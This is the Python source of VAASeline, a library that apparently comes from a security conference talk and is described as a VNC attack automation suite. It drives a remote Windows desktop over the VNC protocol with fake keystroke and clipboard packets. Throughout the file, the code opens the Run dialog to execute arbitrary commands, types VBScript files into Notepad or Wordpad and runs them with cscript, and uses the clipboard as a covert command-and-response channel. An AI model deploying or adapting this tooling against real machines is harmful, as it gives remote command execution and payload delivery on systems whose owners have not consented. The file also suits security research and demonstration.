## VAASeline - VNC Attack Automation Suite
##
## A module to ease the use of RPC/RFB technique for automating control of VNC systems.
## Presented at BlackHat EU 2009 by Rich Smith
##
## Check for the latest version at http://www.immunityinc.com/resources-freesoftware.shtml
"""
   Copyright (C) 2009 Rich Smith (rich@immunityinc.com)

   This library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 3 of the License, or (at your option) any later version.

   This library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.

   You should have received a copy of the GNU Lesser General
   Public License along with this library; if not, write to the
   Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,
   Boston, MA 02110-1301 USA
"""


##Import remote framebuffer protocol input module from the awesome vnc2swf project 
## Get it from: http://www.unixuser.org/~euske/vnc2swf/pyvnc2swf-0.9.5.tar.gz
from rfb import *

import struct, time, socket, Queue, sys, thread
##Alias out lock
lock=thread.allocate_lock()

#TODO Exception class
DEBUG = False
def debug(msg):
    if DEBUG:
        print msg

##http://www.realvnc.com/docs/rfbproto.pdf
class VAASeline(RFBNetworkClient):
    """
    Extension of the RFBNetwork client. This just really adds on the ability to look for
    ServerCutText packets coming back which we will use as our echo/synchronisation markers
    """
    ##Stuff below here are overloads of methods in RFBNetworkClient altered to work better with our misuse of RFB
    def start(self):

        self.pdu_id=1
        self.magic="\x01\x03\x01\x03"
        self.eod="\x0B"
        self.arg_start="\x02\x02\x03\x03"
        self.arg_end="\x03\x03\x02\x02"
        
        try:
            ret=RFBNetworkClient.start(self)
        except Exception, err:
            debug("Error starting RFB: %s"%err)
            return None

        ##Start response pkt capture/sorter thread
        self.mark_q=Queue.Queue(1)
        thread.start_new(self.response_sorter, (3,))

        ##Start pkt dispatcher thread
        self.send_q=Queue.Queue(0)

        thread.start_new(self.dispatcher, ())

        time.sleep(1)

        return ret

    
    def set_pw(self, pw):
        """
        Set the pass to use in authentication
        """
        self.pw = pw
    
    def getpass(self):
        """
        Overload the getpass method of RFBNetworkClient as that prompts for user input which dont want
        """
        return self.pw
    
    def send(self, s):
        """
        Overload the send method to force use of sendall() rather than send()
        """
        return self.sock.sendall(s)
    
    def loop1(self):
        """
        Overload of the method in the RFBProxy class - strip all bar hunting for ServerCutText packets (0x03)
        """
        self.debug=1
        
        ##Get the first byte of the response to see what type of packet it is - we are only interested in ServerCutText Packets (0x03)
        
        rr = self.sock.recv(1, socket.MSG_PEEK)

        if not rr:
            debug( "==No repsonse" )
            
        elif rr == '\x03':
            self.recv_relay(1)

            (length, ) = struct.unpack('>3xL', self.recv_relay(7))
            data = self.recv_relay(length)

            return data

        else:
            ##It's not a ServerCutText packet so we don't handle any differently - throw back into standard RFB lib
            RFBNetworkClient.loop1()


        self.finish_update()

    
    ##Stuff below here is essentially primitive to implement the RPC/RPC technique
    def response_sorter(self, packet_type):
        """
        Thread to process all the return packets from the VNC server and pull out
        those we are using as our reverse messaging channel - ServerCutText (0x03)
        """

        debug( "Starting response capture thread" )

        while 1:
            try:
                ret=self.loop1()
                if ret:
                    ##Put in the Q
                    self.mark_q.put(ret)
                    self.mark_q.join()


            except socket.timeout, err:
                ##Timeout - means operation we sent didn't work as we dont get feedback
                debug( "==Operation timeout - resend vnc command - %s"%(self.sock.gettimeout()))
                self.mark_q.put("<TIMEOUT>")
                self.mark_q.join()



            except socket.error, err:
                debug( "==(SE)%s"%err )
                ##big problem - exit loop
                break
                
            except Exception, err:
                ##Support for timeoutsocket.py rather than socket.timeout
                debug( "==(E)%s"%(err) )
                if "timed out" in str(err):
                    debug("timeoutsocket timeout detected ")
                else:
                    break
            
        debug("==Response sorter thread ended")

    def wait_for_complete(self, mark, fn=None, wp=None):
        """
        Here we try and validate what we sent/executed before was what we intended.
        We compared the command with the buffer that get copied back, if it
        doesent match, we retry
        """
        while 1:
            ret=self.mark_q.get()

            if ret == "<TIMEOUT>":
                debug( "==Timeout caught" )


            if len(ret) < len(mark):
                debug( "==Echo back didn't match sent command, we got '%s'"%(ret) )
                debug( "==LENGTH SENT:%s RET:%s"%(len(mark), len(ret)) )

                ##Was this a normal command from 'run' or a vbscript echo?
                ## if a filename was supplied its a vbscript echo.
                if fn:
                    debug( "...resending vbs")
                    self.mark_q.task_done()

                    self.rfb_send_vbs(mark, fn)
                    break
                else:
                    debug( "...resending command")
                    self.mark_q.task_done()

                    self.rfb_execute_cmd(mark)
                    break
            else:
                debug( "*OPERATION COMPLETE*: echo back matched sent" )
                #debug( "*OPERATION COMPLETE*: %s returned"%(ret) )
                self.mark_q.task_done()
                break

    def dispatcher(self):
        """
        Thread function to take items from a queue and dispatch them as RFB packets
        """
        debug( "...Starting dispatcher thread, waiting for data on queue.....")
        while 1:
            pkt=self.send_q.get()

            if pkt == "<END_QUEUE_LOOP>":
                break

            self.send(pkt)

            time.sleep(0.2)

    def key_event(self, keysymnum, key_down):
        """
        Construct a key event
        """
        fake_keystroke=""

        ##key input event - always this value
        fake_keystroke+=struct.pack('!B',0x04)

        ##key down flag - 1=key down 0=keyup
        fake_keystroke+=struct.pack('!B',key_down)

        ##Byte align pad
        fake_keystroke+=struct.pack('!H',0x00)
        ##Actual key to send - X11/keysymdef.h
        fake_keystroke+=struct.pack('!L', keysymnum)

        return fake_keystroke

    def rfb_keystrokes(self, cmd, meta=0, enter=1, send=1):
        """
        Function that takes in a string and sends it as key presses to the
        socket object provided
        socket - the socket to send the data on
        cmd - the string to send
        meta - (0=not a meta,1=fi,2)
        """
        keysym_dict={"ENTER":0xff0d,
                                "WINDOWS":0xffeb,
                                "ALT":0xffe9,
                                "CTRL":0xffe3,
                                "SHIFT":0xffe1,
                                "ESCAPE":0xff1b,
                                "BACKSPACE":0xff08,
                                "DELETE":0xffff,
                                "F4":0xffc1,
                                "LEFT":0xff51}

        spec_char_pos={}

        fake_keystroke=[]

        ##add in an ENTER at the end of the string if needed
        if enter:
            cmd=cmd+"<@ENTER@>"

        ##Look for special characters
        spec=cmd.find("<@")
        if spec != -1:
            ##may be a special char being passed - look for closing tag
            end_spec=cmd[spec+2:].find("@>")
            if end_spec != -1:
                ##we have aspecial char being passed - i.e <@ENTER@>
                spec_char=cmd[spec+2:spec+2+end_spec]

                ##now look up the keysymdef of this special char
                try:
                    spec_char_pos[spec]=keysym_dict[spec_char]
                    cmd=cmd[:spec]+"\x00"+cmd[spec+2+end_spec+2:]
                except KeyError:
                    raise "special character not known"

        x=0
        for char in cmd:

            #print x
            if x in spec_char_pos:
                keysymnum=spec_char_pos[x]
            else:
                #print "norm"
                keysymnum=ord(char)

            ##For each keystroke we must send both the 'keydown' and 'keyup' packets
            ## if this is a meta key then the up/down depends on if it is at the start or
            ## end of the sequence obviously. 1 is down 0 is up
            if meta == 1:
                fake_keystroke.append(self.key_event(keysymnum, 1))
            elif meta ==2:
                fake_keystroke.append(self.key_event(keysymnum, 0))
            else:
                ##Just a standard key press so we do down & up
                fake_keystroke.append(self.key_event(keysymnum, 1))
                fake_keystroke.append(self.key_event(keysymnum, 0))

            x+=1

        ##Add to the dispatcher q ?
        if send:
            for stroke in fake_keystroke:
                self.send_q.put(stroke)
        else:
            return fake_keystroke[0]

    def rfb_return_marker(self):
        """
        This is used as the reverse messaging channel used to indicate when an operation has completed.
        The marker character is sent, then shift and left is sent to highlight that char, then ctrl-c to
        copy it.
        The VNC server will then send a ServerCutText packet which we will wait to recieve.
        When we receive it we know our previous operation has completed and so we can continue with the next part

        This is the only universal way I can find of doing this......
        """
        ##TODO - change so that this is done at the start of a new command (bar the first) rather than after the last command
        ##     This will save us an unrequired run command pop up and an F4.

        ##Bring up the run command window - by default last command typed is highlighted
        self._run_command()

        ##Copy it to make server send ServerCutText message
        self.rfb_keystrokes("<@CTRL@>", meta=1, enter=0)
        self.rfb_keystrokes("c", enter=0)
        self.rfb_keystrokes("<@CTRL@>", meta=2, enter=0)

        ##Close run command window
        self.close_window()

    def rfb_cut_buffer(self, buffer):
        """
        Construct a cut buffer full packet with user data in
        """
        fake_keystroke=""

        ##ClientCutText command - always this value
        fake_keystroke+=struct.pack('!B',0x06)

        ##Pad
        fake_keystroke+=struct.pack('!HB',0x00,0x00)

        ##Length of our cut buffer
        fake_keystroke+=struct.pack('!L',len(buffer))

        ##Actual data in the cut buffer
        for buf_char in buffer:
            fake_keystroke+=struct.pack('!B', buf_char)

        return fake_keystroke

    def rfb_paste(self, cmd, size=50000):
        """
        Try and use the cut buffer to send data rather than a long set of key events
        The size of each buffer send is limited by the size var - deafult 50000
        """
        ##build up a buffer of data to dump to MAX SIZE  'size'
        buffer=[]
        for char in cmd:
            buffer.append(ord(char))

            #Are we at max size??
            if len(buffer) >= size:
                ##Make the client cut buffer pkt
                rfb_cut_pkt=self.rfb_cut_buffer(buffer)
                ##Add to dispatch q
                self.send_q.put(rfb_cut_pkt)

                time.sleep(0.5)

                ##Now send the ctrl-v (paste) to blit it to the window
                self.rfb_keystrokes("<@CTRL@>",enter=0,meta=1)
                self.rfb_keystrokes("v",enter=0)
                self.rfb_keystrokes("<@CTRL@>",enter=0,meta=2)

                ##flush local buffer
                buffer=[]
                continue
        else:
            ##Send last chunklet
            if len(buffer) != 0:
                ##Make the client cut buffer pkt
                rfb_cut_pkt=self.rfb_cut_buffer(buffer)
                ##Add to dispatch q
                self.send_q.put(rfb_cut_pkt)

                time.sleep(0.5)

                ##Now send the ctrl-v (paste) to blit it to the window
                self.rfb_keystrokes("<@CTRL@>",enter=0,meta=1)
                self.rfb_keystrokes("v",enter=0)
                self.rfb_keystrokes("<@CTRL@>",enter=0,meta=2)

    def rfb_execute_cmd(self, cmd, id="1"):
        """
        Open up the run command box and write in a command to execute
        If id is set to None or 0 then we dont wait for the complete signal, normally cuz
        we need to keep focus on whatever we have just executed (e.g. wordpad)
        """
        ##We need to take off any trailing spaces from the command as these are stripped in the run command box
        ## when we do a copy for the return ServerCutText packet later & this screws up our sync matching
        while 1:
            if cmd[-1] == " ":
                cmd=cmd[:-1]
            else:
                break

        debug( "*POP*: Start menu")
        self._run_command()
        self.rfb_keystrokes("<@DELETE@>", enter=0)

        ##do pre command wait until cut text here ???
        debug("*PASTE*: - %s"%(cmd))
        ##Fill the cut buffer with the command
        self.rfb_paste("%s"%(cmd))

        time.sleep(4)

        ##Annnnd complete with an enter
        self.rfb_keystrokes("",enter=1)

        if id:
            ##Now illicit a marker so we know when we can continue
            #debug("setting mark")
            self.rfb_return_marker()

            ##And wait until we get that marker echo'd back to us
            #debug( "Waiting for marker back.......")
            self.wait_for_complete(cmd)

        return cmd

    def close_window(self):
        """
        Issue an Alt-F4 to close a currently focussed window
        """
        time.sleep(0.4)
        self.rfb_keystrokes("<@ALT@>", meta=1, enter=0)
        self.rfb_keystrokes("<@F4@>", enter=0)
        self.rfb_keystrokes("<@ALT@>", meta=2, enter=0)

    def _run_command(self):
        """
        Bring up a run command..... dialogue box
        """
        ##First we need to get the 'run command' window up
        self.rfb_keystrokes( "<@WINDOWS@>", meta=1, enter=0)
        self.rfb_keystrokes("r", enter=0)
        self.rfb_keystrokes("<@WINDOWS@>", meta=2, enter=0)

        ##Alternate form instread of the windows key press Ctrl-escape
#        self.rfb_keystrokes( "<@CTRL@>", meta=1, enter=0)
#        self.rfb_keystrokes( "<@ESCAPE@>", enter=0)
#        self.rfb_keystrokes( "<@CTRL@>", meta=2, enter=0)
#        self.rfb_keystrokes( "r", enter=0)

        ##Give it a sec to pop
        time.sleep(2)

   
    def rfb_run_vbs(self, vbs_name):
        """
        Run a previously uploaded vbscript
        """
        ##Leave the cmd.exe open or not depending on the DEBUG var
        if DEBUG:
            self.rfb_execute_cmd('cmd /k "cscript //Nologo %s" '%(vbs_name))
        else:
            self.rfb_execute_cmd('cmd /c "cscript //Nologo %s" '%(vbs_name))

    def rfb_send_vbs(self, command, filename, id="1"):
        """
        Wrapper for the lower level functionality in the functions below
            - tries to pick the best way to do what we want
        """
        ##Switch between notepad and wordpad depending on length of content to be echoed
        wordpad=False
        if len(command) <= 20000: #Check this value
            ##Short enough to do via notepad
            debug( "*EXECUTING NOTEPAD*")
            self.rfb_execute_cmd("notepad %s"%(filename), id=None)
            time.sleep(0.2)
            self.rfb_keystrokes("",enter=1)

            self.rfb_keystrokes("<@CTRL@>",enter=0,meta=1)
            self.rfb_keystrokes("a",enter=0)
            self.rfb_keystrokes("<@CTRL@>",enter=0,meta=2)

            self.rfb_keystrokes("<@DELETE@>", enter=0)

        else:
            ##to big do wordpad with all the extra crap it involves
            wordpad=True
            ##Wordpad moans if file has no content so echo it some first to create the file
            debug( "Touching file")
            self.rfb_execute_cmd('cmd /c "echo # > %s" '%(filename))

            ##Now open up wordpad
            debug( "Executing wordapd")
            self.rfb_execute_cmd("wordpad %s"%(filename), id=None)
            time.sleep(0.5)

            ##And delete what we echoed
            debug( "deleteing echo char's")
            self.rfb_keystrokes("<@CTRL@>",enter=0,meta=1)
            self.rfb_keystrokes("a",enter=0)
            self.rfb_keystrokes("<@CTRL@>",enter=0,meta=2)
            self.rfb_keystrokes("<@DELETE@>", enter=0)

        ##Now paste vbscript into notepad
        debug("*PASTING BUFFER*")
        self.rfb_paste(command)
        time.sleep(5.0)

        ##Save it
        debug( "*SAVING*")
        self.rfb_keystrokes("<@CTRL@>",enter=0,meta=1)
        self.rfb_keystrokes("s",enter=0)
        self.rfb_keystrokes("<@CTRL@>",enter=0,meta=2)

        ##Select all content within wordpad and check it echo'd right
        if id :
            #Now illicit a marker so we know when we can continue
            #debug( "setting mark")
            self.rfb_keystrokes("<@CTRL@>",enter=0,meta=1)
            self.rfb_keystrokes("a",enter=0)
            self.rfb_keystrokes("<@CTRL@>",enter=0,meta=2)

            self.rfb_keystrokes("<@CTRL@>",enter=0,meta=1)
            self.rfb_keystrokes("c",enter=0)
            self.rfb_keystrokes("<@CTRL@>",enter=0,meta=2)


            ##And wait until we get that marker echo'd back to us
            #debug( "Waiting for marker back.......")
            self.wait_for_complete(command, fn=filename, wp=wordpad)


        ##Exit notepad alt - F4
        debug("*CLOSING*")
        self.close_window()


    ##Stuff below here is the new way of doing shit using the clipboard for I/O
    def create_pdu(self, opcode, data, args=None):
        """
        NOTE: Clipboard cannot contain NULL (ascii code 0) otherwise is fails

        Construct the PDU, format is:

        [ Magic | SeqID | OpCode | data/operands ..... | End of data marker]
            4       1       1        variable                   4
        """
        buffer=[]

        ##Tag so as we know what on the clipboard is for us and what is just normal text - 4 bytes
        for m in self.magic:
            buffer.append( m )

        ##PDU ID so we can ack/order it etc - 1 byte
        # Can't have 0's on the clipboard
        
        if self.pdu_id == 0:
            self.pdu_id+=1
            #self.pdu_id=self.pdu_id%256
            self.pdu_id=self.pdu_id%9

        buffer.append( struct.pack("B", self.pdu_id) )
        self.pdu_id+=1
        #self.pdu_id=self.pdu_id%256
        self.pdu_id=self.pdu_id%9

        ##Opcode - 1 byte
        buffer.append( struct.pack("B", opcode) )
        
        ##If we have args add em here
        if args:
            for m in self.arg_start:
                buffer.append( m )
            for char in args:
                buffer.append( struct.pack('B', ord(char) ) )
            for m in self.arg_end:
                buffer.append( m )

        ##Now the data - ?? bytes
        for char in data:
            buffer.append( struct.pack('B', ord(char) ) )

        ##End of data marker - 1 byte
        buffer.append( self.eod )

        debug( "Sending PDU: %s...%s"%(buffer[:15], int(self.pdu_id-1)))
        return buffer

    def parse_pdu(self, pdu):
        """
        Unravel a reponse PDU and check its all good
        """
        ##Check for magic - is this a response PDU or just other clipboard data?
        if pdu[:4] != self.magic:

            #for p in pdu[:4]:
            #    print ord(p)

            #print "---"

            #for p in self.magic:
                #print ord(p)

            debug( "==Non-response PDU found: %s"%(pdu))
            return 0

        ##Check sequence number
        if struct.unpack("B",pdu[4:5])[0] != (self.pdu_id -1)%9:
            
            debug( "|%s|%s"%(pdu[4:5], self.pdu_id))
            debug( "==Out of sequence responce PDU found: %s (%s)"%(pdu, int(struct.unpack("B",pdu[4:5])[0])))
            return 0

        ##Get return value/status
        status=pdu[5:]

        ##Check for EOD marker
        if status[-1] != self.eod:
            debug( "==End of data marker not found: %s"%(pdu))
            return 0

        #Return the status data
        return status

    def send_pdu(self, opcode, data, args=None):
        """
        Send out a PDU appropriateley formatted
        """
        ##Construct a formatted PDU
        buffer=self.create_pdu(opcode, data, args)

        ##Make the client cut buffer pkt
        rfb_cut_pkt=self.construct_client_cut_text(buffer)
        ##Add to dispatch q
        self.send_q.put(rfb_cut_pkt)

        ##Now wait for the return code/status
        while 1:
            ret=self.mark_q.get()
            debug( "**ResponsePDU: %s seq_id: %s"%(ret[:15], struct.unpack("B",ret[4:5])[0]) )

            ##And parse it
            status=self.parse_pdu(ret)

            self.mark_q.task_done()

            if status:
                break
            else:
                ##Call for response pdu to be reissued?
                pass


        ##Toss the response back to be actioned -1 to get rid of eod marker
        return status[:-1]


    def construct_client_cut_text(self, buffer):
        """
        Construct a ClientCutText full packet with user data in
        """
        fake_keystroke=""

        ##ClientCutText command - always this value
        fake_keystroke+=struct.pack('!B',0x06)

        ##Pad
        fake_keystroke+=struct.pack('!HB',0x00,0x00)

        ##Length of our cut buffer
        fake_keystroke+=struct.pack('!L',len(buffer))

        ##Actual data in the cut buffer
        for buf_char in buffer:
            fake_keystroke+=buf_char

        return fake_keystroke

if __name__ == "__main__":
    
    print "VAASeline is a library module, it is not intended to be run directly."
    print "Look at vaaseline_demo.py for example code."
